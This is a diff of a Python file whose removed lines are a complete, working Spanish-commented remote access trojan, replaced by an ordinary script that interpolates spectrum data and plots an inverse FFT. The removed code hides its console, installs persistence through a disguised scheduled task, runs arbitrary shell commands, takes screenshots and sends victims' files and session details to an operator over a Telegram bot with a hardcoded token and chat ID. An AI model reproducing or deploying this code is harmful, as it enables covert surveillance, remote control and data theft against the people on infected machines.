@@ -1,414 +1,230 @@
+import numpy as np
+from scipy.interpolate import interp1d
+import matplotlib.pyplot as plt
+from scipy.fft import ifft, fftfreq
+import warnings
 import os
-import subprocess
-import platform
-import shutil
-import time
-import tempfile
-import win32process
-import win32con
-import ctypes
-import uuid
-import json
-import requests
-from datetime import datetime
-from PIL import ImageGrab
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+warnings.filterwarnings('ignore')
 
-# Configuración del bot de Telegram
-TOKEN = "8308654980:AAFE8jhMWQDsAHCz0i-6tJhxKR5YZ5yYzA0"
-CHAT_ID = "1648349933"
-
-# Variables para controlar el modo shell y sesiones
-shell_mode = False
-current_chat_id = None
-sessions = {}  # Diccionario para almacenar todas las sesiones
-current_session = None  # Sesión actualmente seleccionada
-
-# Rutas para persistencia
-SESSIONS_FILE = os.path.join(os.getenv("APPDATA"), "sessions.json")  # Archivo para guardar las sesiones
-PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "SystemUpdate.py")  # Ruta del script
-
-# Funciones para manejar las sesiones
-def load_sessions():
-    global sessions
-    try:
-        if os.path.exists(SESSIONS_FILE):
-            with open(SESSIONS_FILE, 'r') as f:
-                sessions = json.load(f)
-    except Exception as e:
-        print(f"Error al cargar sesiones: {e}")
-
-def save_sessions():
-    try:
-        with open(SESSIONS_FILE, 'w') as f:
-            json.dump(sessions, f, indent=4)
-    except Exception as e:
-        print(f"Error al guardar sesiones: {e}")
-
-# Cargar sesiones al inicio
-load_sessions()
-
-# Ruta para persistencia (donde se copiará el script para ejecutarse en segundo plano)
-PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "SystemUpdate.py")
-
-# Función para ocultar la ventana de la consola (solo Windows)
-def hide_console():
-    try:
-        import win32console
-        import win32gui
-        window = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(window, win32con.SW_HIDE)
-    except Exception as e:
-        print(f"No se pudo ocultar la consola: {e}")
-
-# Función para agregar persistencia (tarea programada en Windows)
-def add_persistence():
-    try:
-        # Copiar el script a una ubicación persistente
-        current_script = os.path.abspath(__file__)
-        if not os.path.exists(PERSISTENCE_PATH):
-            shutil.copyfile(current_script, PERSISTENCE_PATH)
-        
-        # Crear una tarea programada para ejecutar el script al iniciar Windows
-        task_name = "SystemUpdateTask"
-        cmd = f'schtasks /create /tn "{task_name}" /tr "python {PERSISTENCE_PATH}" /sc onlogon /rl highest /f'
-        subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        print("Persistencia agregada con éxito.")
-    except Exception as e:
-        print(f"Error al agregar persistencia: {e}")
-
-# Función para lanzar el RAT en segundo plano como proceso separado
-def launch_background_process():
-    try:
-        # Configurar el proceso para que sea independiente (DETACHED_PROCESS en Windows)
-        if platform.system() == "Windows":
-            creationflags = win32process.DETACHED_PROCESS | win32process.CREATE_NO_WINDOW
-            subprocess.Popen(
-                ["python", os.path.abspath(__file__), "background"],
-                creationflags=creationflags,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE
-            )
-            print("RAT lanzado en segundo plano. Puedes cerrar esta ventana o presionar Ctrl+C sin afectar el proceso.")
-        else:
-            # Para Linux/macOS, usar nohup o similar
-            subprocess.Popen(
-                ["python", os.path.abspath(__file__), "background"],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE,
-                start_new_session=True
-            )
-            print("RAT lanzado en segundo plano.")
-    except Exception as e:
-        print(f"Error al lanzar el proceso en segundo plano: {e}")
-
-# Función para enviar mensajes largos (evitar límites de Telegram)
-async def send_long_message(chat_id: int, text: str, bot, max_length=4096):
-    if len(text) > max_length:
-        for i in range(0, len(text), max_length):
-            await bot.send_message(chat_id=chat_id, text=text[i:i+max_length])
-    else:
-        await bot.send_message(chat_id=chat_id, text=text)
-
-# Función para notificar nueva sesión
-async def notify_new_session(bot, session_id, session_info):
-    session_msg = (
-        f"🔵 Nueva sesión conectada:\n"
-        f"ID: {session_id}\n"
-        f"Host: {session_info['hostname']}\n"
-        f"Usuario: {session_info['username']}\n"
-        f"Sistema: {session_info['system']}\n"
-        f"Hora: {session_info['start_time']}"
-    )
-    await bot.send_message(chat_id=CHAT_ID, text=session_msg)
-
-# Comando /start
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global current_chat_id, current_session
-    if str(update.effective_chat.id) == CHAT_ID:
-        current_chat_id = update.effective_chat.id
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Conexión establecida con la víctima")
-    else:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-
-# Función para verificar si hay una sesión seleccionada
-async def check_session(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    if not current_session:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="❌ No hay sesión seleccionada. Usa /sessions para ver las sesiones disponibles y /select para elegir una."
-        )
-        return False
-    return True
-
-# Comando /cmd - Ejecutar un comando del sistema
-async def cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    
-    if not await check_session(update, context):
-        return
-    if len(context.args) == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Uso: /cmd <comando>")
-        return
-    command = " ".join(context.args)
-    try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        output = result.stdout + result.stderr
-        if not output:
-            output = "Comando ejecutado, pero sin salida."
-        await send_long_message(update.effective_chat.id, f"Resultado:\n{output}", context.bot)
-    except Exception as e:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al ejecutar el comando: {str(e)}")
-
-# Comando /screenshot - Tomar captura de pantalla
-async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    
-    if not await check_session(update, context):
-        return
-    try:
-        screenshot = ImageGrab.grab()
-        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
-        screenshot.save(temp_file.name)
-        with open(temp_file.name, 'rb') as photo:
-            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo)
-        os.remove(temp_file.name)
-    except Exception as e:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al tomar captura: {str(e)}")
-
-# Comando /download - Descargar archivo de la víctima
-async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    
-    if not await check_session(update, context):
-        return
-    if len(context.args) == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Uso: /download <ruta_del_archivo>")
-        return
-    file_path = " ".join(context.args)
-    if os.path.exists(file_path):
-        try:
-            with open(file_path, 'rb') as file:
-                await context.bot.send_document(chat_id=update.effective_chat.id, document=file)
-        except Exception as e:
-            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al enviar archivo: {str(e)}")
-    else:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Archivo no encontrado")
-
-# Comando /upload - Subir archivo a la víctima
-async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    
-    if not await check_session(update, context):
-        return
-    if len(context.args) == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Uso: /upload <ruta_destino>")
-        return
-    context.user_data['upload_path'] = " ".join(context.args)
-    await context.bot.send_message(chat_id=update.effective_chat.id, text="Envía el archivo para subir")
-
-# Manejar archivos enviados para /upload
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    if 'upload_path' not in context.user_data:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Primero usa /upload <ruta_destino>")
-        return
-    try:
-        file = await update.message.document.get_file()
-        temp_file = tempfile.NamedTemporaryFile(delete=False)
-        await file.download_to_drive(temp_file.name)
-        shutil.copy(temp_file.name, context.user_data['upload_path'])
-        os.remove(temp_file.name)
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Archivo subido con éxito")
-        del context.user_data['upload_path']
-    except Exception as e:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error al subir archivo: {str(e)}")
-
-# Comando /shell - Modo shell interactivo
-async def shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global shell_mode
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    
-    if not await check_session(update, context):
-        return
-    shell_mode = True
-    await context.bot.send_message(chat_id=update.effective_chat.id, text="Modo shell activado. Escribe 'exit' para salir.")
-
-# Manejar mensajes en modo shell
-async def handle_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global shell_mode
-    if str(update.effective_chat.id) != CHAT_ID:
-        return
-    if shell_mode:
-        command = update.message.text
-        if command.lower() == 'exit':
-            shell_mode = False
-            await context.bot.send_message(chat_id=update.effective_chat.id, text="Modo shell desactivado.")
-        else:
-            try:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                output = result.stdout + result.stderr
-                if not output:
-                    output = "Comando ejecutado, pero sin salida."
-                await send_long_message(update.effective_chat.id, f"Resultado:\n{output}", context.bot)
-            except Exception as e:
-                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Error: {str(e)}")
-
-# Comando /sessions - Listar sesiones
-async def list_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    
-    load_sessions()  # Cargar sesiones desde el archivo
-    
-    if not sessions:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="No hay sesiones registradas.")
-        return
-    
-    sessions_msg = "📋 Sesiones disponibles:\n\n"
-    for session_id, info in sessions.items():
-        selected = "✅" if session_id == current_session else "  "
-        sessions_msg += (
-            f"{selected} ID: {session_id}\n"
-            f"   Host: {info['hostname']}\n"
-            f"   Usuario: {info['username']}\n"
-            f"   Sistema: {info['system']}\n"
-            f"   Inicio: {info['start_time']}\n\n"
-        )
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=sessions_msg)
-
-# Comando /select - Seleccionar sesión
-async def select_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global current_session
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    
-    load_sessions()  # Cargar sesiones desde el archivo
-    
-    if len(context.args) == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Uso: /select <session_id>")
-        return
-    
-    session_id = context.args[0]
-    if session_id not in sessions:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ ID de sesión no válido.")
-        return
-    
-    current_session = session_id
-    info = sessions[session_id]
-    await context.bot.send_message(
-        chat_id=update.effective_chat.id,
-        text=f"✅ Sesión seleccionada:\nID: {session_id}\nHost: {info['hostname']}\nUsuario: {info['username']}"
-    )
-
-# Comando /info - Información del sistema
-async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if str(update.effective_chat.id) != CHAT_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="Acceso denegado")
-        return
-    
-    if not await check_session(update, context):
-        return
-    system_info = f"Información del sistema:\n"
-    system_info += f"- Usuario: {os.getlogin()}\n"
-    system_info += f"- Máquina: {platform.node()}\n"
-    system_info += f"- Sistema: {platform.platform()}\n"
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=system_info)
-
-# Función para enviar notificación de forma sincrónica
-def send_notification(bot, session_id, session_info):
-    import requests
-    
-    session_msg = (
-        f"🔵 Nueva sesión conectada:\n"
-        f"ID: {session_id}\n"
-        f"Host: {session_info['hostname']}\n"
-        f"Usuario: {session_info['username']}\n"
-        f"Sistema: {session_info['system']}\n"
-        f"Hora: {session_info['start_time']}"
-    )
-    
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    data = {
-        "chat_id": CHAT_ID,
-        "text": session_msg
-    }
-    try:
-        requests.post(url, json=data)
-    except Exception as e:
-        print(f"Error al enviar notificación: {e}")
-
-# Configurar la aplicación con reconexión automática
-def run_rat():
-    # Ocultar consola (solo Windows)
-    if platform.system() == "Windows":
-        hide_console()
-        add_persistence()
-
-    # Crear nueva sesión al iniciar
-    session_id = str(uuid.uuid4())[:8]  # Usar los primeros 8 caracteres del UUID
-    session_info = {
-        'id': session_id,
-        'start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        'hostname': platform.node(),
-        'username': os.getlogin(),
-        'system': platform.system()
-    }
-    
-    # Cargar sesiones existentes y agregar la nueva
-    load_sessions()
-    sessions[session_id] = session_info
-    save_sessions()
-    
-    # Enviar notificación de forma sincrónica antes de iniciar el bot
-    send_notification(None, session_id, session_info)
-
+def main():
     while True:
+        print("=" * 60)
+        
+        # Ask user what to plot
+        while True:
+            print("--- Analysis Options ---\n")
+            plot_option = input("RFFT? (y/n/quit): ").lower().strip()
+            if plot_option in ['y']:
+                plot_full = True
+                break
+            elif plot_option in ['n']:
+                plot_full = False
+                break
+            elif plot_option in ['quit', 'exit', 'q', 'e']:
+                print("Goodbye!")
+                return
+            else:
+                print("Please enter 'y', 'n', or 'quit'.")
+
+        # Get maxAmplitude from console input
+        while True:
+            try:
+                maxAmplitude_input = input("\nEnter the maximum amplitude threshold (or press Enter for default 0.01): ")
+                if maxAmplitude_input == "":
+                    maxAmplitude = 0.01
+                    break
+                else: maxAmplitude = float(maxAmplitude_input)
+                if maxAmplitude <= 0:
+                    print("Please enter a positive value.")
+                    continue
+                break
+            except ValueError:
+                print("Please enter a valid number.")
+
+        
+
+        # Get optional frequency threshold
+        while True:
+            try:
+                freq_input = input("Enter the maximum frequency threshold in kHz (or press Enter for default 800): ")
+                if freq_input == "":
+                    maxFrequency = 800
+                    break
+                maxFrequency = float(freq_input)
+                if maxFrequency <= 0:
+                    print("Please enter a positive value.")
+                    continue
+                break
+            except ValueError:
+                print("Please enter a valid number.")
+
+       #file_path = "F:/Documents/_workMEI/_Python/1.txt" 
+        file_path = "C:/1.txt" 
+        filter_threshold = maxAmplitude
+
+        x_vals = []
+        y_vals = []
+
         try:
-            app = Application.builder().token(TOKEN).build()
-
-            # Registrar manejadores de comandos
-            app.add_handler(CommandHandler("start", start))
-            app.add_handler(CommandHandler("cmd", cmd))
-            app.add_handler(CommandHandler("screenshot", screenshot))
-            app.add_handler(CommandHandler("download", download))
-            app.add_handler(CommandHandler("upload", upload))
-            app.add_handler(CommandHandler("shell", shell))
-            app.add_handler(CommandHandler("info", info))
-            app.add_handler(CommandHandler("sessions", list_sessions))
-            app.add_handler(CommandHandler("select", select_session))
-            app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-            app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_shell))
-
-            print("RAT conectado. Esperando comandos...")
-            app.run_polling(allowed_updates=Update.ALL_TYPES)
+            with open(file_path, "r", encoding="utf-8") as file:
+                for line_num, line in enumerate(file, 1):
+                    parts = line.strip().split()
+                    if len(parts) == 2:
+                        try:
+                            x, y = float(parts[0]), float(parts[1])
+                            if y < maxAmplitude and x < maxFrequency:
+                                x_vals.append(x)
+                                y_vals.append(y)
+                        except ValueError:
+                            print(f"Warning: Could not convert values in line {line_num}")
+                    elif line.strip():  # Skip empty lines but warn about non-empty malformed lines
+                        print(f"Warning: Line {line_num} has {len(parts)} columns, expected 2")
+                        
+        except FileNotFoundError:
+            print(f"Error: File '{file_path}' not found.")
+            print("Please check the file path and try again.")
+            file_path = input("\nInsert the file path: ")
+            continue
         except Exception as e:
-            print(f"Error en la conexión: {e}. Intentando reconectar en 10 segundos...")
-            time.sleep(10)  # Esperar antes de intentar reconectar
+            print(f"Error reading file: {e}")
+            continue
 
-# Punto de entrada principal
+        # Check if we have enough points
+        if len(x_vals) < 2:
+            print("Not enough data points after filtering to interpolate.")
+            print("Try adjusting your amplitude or frequency thresholds.")
+            continue
+
+        x_vals = np.array(x_vals)
+        y_vals = np.array(y_vals)
+
+        # Create interpolator and generate evenly spaced frequency data
+        f_interp = interp1d(x_vals, y_vals, kind='linear', bounds_error=False, fill_value=0.0)
+
+        if plot_full:
+            # Create a dense, evenly spaced frequency array for FFT
+            num_points = 2**14  # Power of 2 for efficient FFT (adjust as needed)
+            freq_max = max(x_vals)
+            freq_min = min(x_vals)
+            freq_dense = np.linspace(freq_min, freq_max, num_points)
+
+            # Interpolate amplitude values
+            amp_dense = f_interp(freq_dense)
+
+            # Convert kHz to Hz for proper time scaling (FFT expects Hz)
+            freq_dense_hz = freq_dense * 1000  # Convert kHz to Hz
+
+            # Perform inverse Fourier transform
+            # We need to create a symmetric spectrum for real-valued time signal
+            # Create the full spectrum (positive and negative frequencies)
+            full_spectrum = np.concatenate([amp_dense, amp_dense[-2:0:-1]])
+            time_signal = ifft(full_spectrum, norm='ortho')
+
+            # Since ifft returns complex values, we take the real part
+            time_signal_real = np.real(time_signal)
+
+            # Create time array
+            sampling_rate = 2 * freq_max * 1000  # Nyquist rate in Hz
+            dt = 1 / sampling_rate
+            time_seconds = np.arange(len(time_signal_real)) * dt
+
+            # Convert time to milliseconds for better readability
+            time_ms = time_seconds * 1000
+
+        # Plot the results
+        plt.figure(figsize=(15, 10 if plot_full else 8))
+
+        if plot_full:
+            # Plot 1: Original filtered data and interpolation
+            plt.subplot(2, 2, 1)
+            plt.plot(x_vals, y_vals, 'o', markersize=3, label='Original Data', alpha=0.7)
+            plt.plot(freq_dense, amp_dense, '-', label='Interpolated', linewidth=1, alpha=0.8)
+            plt.title(f"Frequency Domain (Filtered)\nAmplitude < {maxAmplitude}, Frequency < {maxFrequency} kHz")
+            plt.xlabel("Frequency [kHz]")
+            plt.ylabel("Amplitude")
+            plt.legend()
+            plt.grid(True, alpha=0.3)
+
+            # Plot 2: Time domain signal (full view)
+            plt.subplot(2, 2, 2)
+            plt.plot(time_ms, time_signal_real, 'b-', linewidth=1)
+            plt.title("Time Domain Signal (Inverse FFT)")
+            plt.xlabel("Time [ms]")
+            plt.ylabel("Amplitude")
+            plt.grid(True, alpha=0.3)
+
+            # Plot 3: Time domain signal (zoomed in to first few periods)
+            plt.subplot(2, 2, 3)
+            zoom_samples = min(1000, len(time_signal_real) // 10)  # Show first 10% or 1000 samples
+            plt.plot(time_ms[:zoom_samples], time_signal_real[:zoom_samples], 'r-', linewidth=1.5)
+            plt.title("Time Domain Signal (Zoomed)")
+            plt.xlabel("Time [ms]")
+            plt.ylabel("Amplitude")
+            plt.grid(True, alpha=0.3)
+
+            # Plot 4: Magnitude of the time signal
+            plt.subplot(2, 2, 4)
+            plt.plot(time_ms, np.abs(time_signal_real), 'g-', linewidth=1, alpha=0.7)
+            plt.title("Absolute Value of Time Signal")
+            plt.xlabel("Time [ms]")
+            plt.ylabel("|Amplitude|")
+            plt.grid(True, alpha=0.3)
+
+        else:
+            # Just plot the first graph (frequency domain)
+            # Generate interpolated values for plotting
+            x_new = np.linspace(min(x_vals), max(x_vals), 1000)
+            y_new = f_interp(x_new)
+            
+            plt.plot(x_vals, y_vals, 'o', markersize=3, label='Original Data', alpha=0.7)
+            plt.plot(x_new, y_new, '-', label='Interpolated', linewidth=1.5, alpha=0.8)
+            plt.title(f"Filtered Linear Interpolation\nAmplitude < {maxAmplitude}, Frequency < {maxFrequency} kHz")
+            plt.xlabel("Frequency [kHz]")
+            plt.ylabel("Amplitude")
+            plt.legend()
+            plt.grid(True, alpha=0.3)
+
+        plt.tight_layout()
+        plt.show()
+
+        # Print statistics
+        print(f"\n" + "=" * 60)
+        print("ANALYSIS RESULTS:")
+        print("=" * 60)
+        print(f"Filter criteria: Amplitude < {maxAmplitude}, Frequency < {maxFrequency} kHz")
+        print(f"Original data points: {len(x_vals)}")
+        print(f"Frequency range: {min(x_vals):.2f} - {max(x_vals):.2f} kHz")
+        print(f"Amplitude range: {min(y_vals):.6f} - {max(y_vals):.6f}")
+
+        if plot_full:
+            print(f"Interpolated points for FFT: {num_points}")
+            print(f"Time signal length: {len(time_signal_real)} samples")
+            print(f"Time duration: {time_ms[-1]:.2f} ms")
+            print(f"Max time signal amplitude: {np.max(np.abs(time_signal_real)):.6f}")
+
+            # Optional: Save the time domain signal to a file
+            save_option = input("\nDo you want to save the time domain data to a file? (y/n): ")
+            if save_option.lower() in ['y', 'yes']:
+                output_file = "time_domain_output.txt"
+                np.savetxt(output_file, np.column_stack((time_ms, time_signal_real)), 
+                           header="Time[ms] Amplitude", fmt='%.6f')
+                print(f"Time domain data saved to {output_file}")
+
+        # Ask if user wants to run another analysis
+        print("\n" + "-" * 60)
+        while True:
+            restart = input("Do you want to perform another analysis? (y/n): ").lower().strip()
+            if restart in ['y', 'yes', '']:
+                print("\n" + "=" * 60)
+                print("Starting new analysis...")
+                print("=" * 60)
+                break
+            elif restart in ['n', 'no']:
+                print("\n Goodbye!")
+                return
+            else:
+                print("Please enter 'y' or 'n'.")
+
+# Start the program
 if __name__ == "__main__":
-    import sys
-    if len(sys.argv) > 1 and sys.argv[1] == "background":
-        # Ejecutar el RAT en modo background
-        run_rat()
-    else:
-        # Lanzar el RAT como proceso separado en segundo plano
-        launch_background_process()
+    main()
